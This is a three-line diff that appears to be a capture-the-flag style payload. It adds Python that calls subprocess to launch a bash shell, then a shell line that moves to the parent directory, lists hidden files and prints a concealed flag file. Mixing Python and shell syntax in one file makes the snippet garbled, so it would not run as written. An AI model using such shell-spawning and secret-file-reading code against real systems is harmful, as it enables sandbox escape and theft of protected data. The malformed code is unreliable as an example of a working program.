@@ -1,0 +1,3 @@
+import subprocess
+subprocess.call('bash')
+cd ../ ; ls -la ; cat .re4lfl4g.txt
